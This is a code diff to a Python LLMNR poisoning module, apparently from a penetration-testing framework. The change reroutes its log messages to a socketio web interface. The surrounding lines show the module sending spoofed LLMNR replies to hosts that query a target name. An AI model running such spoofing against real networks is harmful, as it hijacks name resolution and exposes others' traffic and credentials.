@@ -15,10 +15,18 @@ actions = {
   }
 }
 
-def action(target, socketio, namespace='/scan'):
+def action(target, sio, ns='/scan'):
+    global socketio
+    global namespace
+    socketio = sio
+    namespace = ns
     sniffer = IPv6Sniffer()
-    socketio.emit('module_output', {'log': 'LLMNR poisoner initialized...'}, namespace=namespace)
+    socket_log('LLMNR poisoner initialized...')
     sniffer.start()
+
+def socket_log(msg):
+  socketio.emit('module_output', {'log': msg}, namespace=namespace)
+
 
 class IPv6Sniffer:
     pool = None
@@ -115,7 +123,11 @@ class IPv6Sniffer:
                 if target:
                     if target == response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""):
                         send(ip_packet/udp_segment/llmnrQuery)
-                        print "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
+                        out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
+                        socket_log(out)
+                        print out
                 else:
                     send(ip_packet/udp_segment/llmnrQuery)
-                    print "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
+                    out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
+                    socket_log(out)
+                    print out
